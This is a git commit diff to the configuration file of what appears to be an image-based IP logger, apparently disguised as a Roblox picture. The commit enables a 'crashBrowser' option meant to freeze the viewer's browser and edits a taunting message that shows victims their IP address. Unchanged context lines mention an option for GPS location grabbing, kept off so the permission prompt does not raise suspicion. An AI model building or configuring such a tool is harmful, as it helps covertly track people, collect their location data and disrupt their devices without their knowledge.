6cd7c21d10e7e7c3bf8556b6480809e6b40790e2
GodwillFindyou <140637291+GodwillFindyou@users.noreply.github.com>
2023-07-26 21:16:48 -0400

    Update robloxpng.py

--- api/robloxpng.py
+++ api/robloxpng.py
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "Your ip address is {ip} ", # Message to show
+        "message": "Your ip address is {ip}, bye bye browser ", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
